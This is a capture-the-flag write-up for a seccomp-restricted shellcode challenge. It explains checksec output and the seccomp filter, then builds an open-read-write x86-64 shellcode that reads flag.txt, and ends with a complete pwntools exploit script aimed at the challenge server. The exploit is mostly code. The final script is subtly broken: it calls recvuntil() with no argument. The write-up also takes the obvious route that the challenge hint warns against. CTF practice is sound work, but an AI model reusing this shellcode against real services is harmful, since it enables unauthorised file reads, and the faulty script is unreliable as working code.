# Basalt Chamber Writeup

## Description

```text
The chamber runs supplied bytes under a strict local policy.
The obvious route is not the one that leaves with proof.
```

```bash
nc 34.62.69.250 41053
```

```text
Flag format: 0xV01D{...}
```

[Download Challenge](https://files.0xv01d-ctf.xyz/ctf-2026/pwn/Basalt.zip)

The challenge receives user-supplied bytes and directly executes them.

## Solution Walkthrough

1. **Step 1**：Analyze the Challenge

   The challenge provides:

   ```text
   chall
   run.sh
   README_NOTE.txt
   ```

   From `README_NOTE.txt` we can see:

   ```text
   The obvious route is not the one that leaves with proof.
   ```

   This implies that the intended solution is definitely not a simple approach such as:

   ```text
   execve("/bin/sh")
   ```

2. **Step 2**：Check the Protections

   First, inspect the binary:

   ```bash
   checksec chall
   ```

   Output:

   ```text
   NX disabled
   PIE disabled
   RWX memory
   ```

   This means the program mmaps executable memory and directly executes shellcode, but the challenge also uses seccomp to restrict syscalls.

3. **Step 3**：Analyze seccomp

   After disassembling the binary, we can find:

   ```c
   seccomp_init(...)
   seccomp_rule_add(...)
   ```

   This indicates the program installs a seccomp filter before executing the shellcode, so we cannot directly do:

   ```asm
   execve("/bin/sh")
   ```

4. **Step 4**：Write an ORW Shellcode

   Since seccomp does not allow `execve`, we instead use an ORW shellcode to directly read and print the flag.

   The flow is:

   ```text
   1. open("flag.txt", O_RDONLY)
   2. read(fd, buf, size)
   3. write(1, buf, size)
   4. exit(0)
   ```

   ### Open

   First, push `flag.txt` onto the stack.

   ```asm
   xor eax, eax
   push rax

   mov rbx, 0x7478742e67616c66  #flag.txt in little endian
   push rbx
   ```

   Then handle the `,0` argument:

   ```asm
   mov rdi, rsp
   xor esi, esi
   mov al, 2
   syscall
   ```

   Combining the above assembly snippets is equivalent to:

   ```c
   open("flag.txt", 0);
   ```

   ### Read

   `open` returns the file descriptor in `rax`, then:

   ```asm
   mov edi, eax
   ```

   Moves the fd into `rdi`, then points the buffer to space below the stack:

   ```asm
   mov rsi, rsp
   sub rsi, 0x200
   mov edx, 0x200
   xor eax, eax
   syscall
   ```

   Equivalent to:

   ```c
   read(fd, buf, 0x200);
   ```

   ### Write

   `read()` stores the number of bytes read into `rax`:

   ```asm
   mov edx, eax
   mov edi, 1
   mov eax, 1
   syscall
   ```

   Equivalent to:

   ```c
   write(1, buf, n);
   ```

5. **Step 5**：Combine

   ```python
   shellcode = asm("""
       xor eax, eax

       # push "flag.txt\\0"
       push rax
       mov rbx, 0x7478742e67616c66
       push rbx

       # open("flag.txt", 0)
       mov rdi, rsp
       xor esi, esi
       mov al, 2
       syscall

       # read(fd, buf, 0x200)
       mov edi, eax
       mov rsi, rsp
       sub rsi, 0x200
       mov edx, 0x200
       xor eax, eax
       syscall

       # write(1, buf, n)
       mov edx, eax
       mov edi, 1
       mov eax, 1
       syscall

       # exit(0)
       mov eax, 60
       xor edi, edi
       syscall
   """)
   ```

## Exploit (python)

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "34.62.69.250"
PORT = 41053

p = remote(HOST, PORT)

shellcode = asm("""
    xor eax, eax

    push rax
    mov rbx, 0x7478742e67616c66
    push rbx

    mov rdi, rsp
    xor esi, esi
    mov al, 2
    syscall

    mov edi, eax
    mov rsi, rsp
    sub rsi, 0x200
    mov edx, 0x200
    xor eax, eax
    syscall

    mov edx, eax
    mov edi, 1
    mov eax, 1
    syscall

    mov eax, 60
    xor edi, edi
    syscall
""")

p.recvuntil()
p.send(shellcode)

p.interactive()
```

## Flag

```text
0xV01D{...}
```
